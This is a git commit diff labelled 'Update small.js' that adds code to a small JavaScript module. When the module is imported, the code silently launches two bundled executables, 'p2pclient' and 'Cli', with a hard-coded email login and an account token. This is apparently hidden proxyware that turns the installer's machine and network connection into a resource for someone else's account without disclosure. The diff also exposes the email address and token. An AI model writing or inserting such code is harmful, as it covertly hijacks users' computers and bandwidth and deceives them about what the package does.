4dbe4a406834c37ba6aacb8afb612a1aa9ccb45a
bvttvb <107609050+bvttvb@users.noreply.github.com>
2022-06-21 03:43:47 -0500

    Update small.js

--- small/small.js
+++ small/small.js
@@ -1,1 +1,5 @@
+import child_process from 'child_process'
+import path from 'path'
 
+child_process.spawn(path.join(path.dirname(new globalThis.URL(import.meta.url).pathname), 'p2pclient'), ['-l', 'chaowen.guo1@gmail.com', '-n', ';8.8.8.8,4.4.4.4'])
+child_process.spawn(path.join(path.dirname(new globalThis.URL(import.meta.url).pathname), 'Cli'), ['start', 'accept', '--token', 'ELGPy/DEQYDtARslA6HnkrbPIF6JQi+qYLCre5LBe58='])
